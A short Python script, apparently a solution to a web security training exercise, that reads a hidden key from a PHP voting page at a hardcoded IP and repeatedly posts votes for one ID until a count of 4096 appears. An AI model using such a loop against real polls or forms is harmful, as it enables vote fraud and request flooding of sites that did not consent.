#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

URL = 'http://158.69.76.135/level1.php'
ID = '2500'

check = ID + "    </td>\n    <td>\n4096"

r = requests.get(URL)
soup = BeautifulSoup(r.text, 'html.parser')

key = soup.find('input', {'name': 'key'}).get('value')
payload = {'id': ID, 'holdthedoor': 'submit', 'key': key}

while check not in r.text:
    r = requests.post(URL, data=payload, headers={
                      'Cookie': 'HoldTheDoor=' + key})

print("Done")
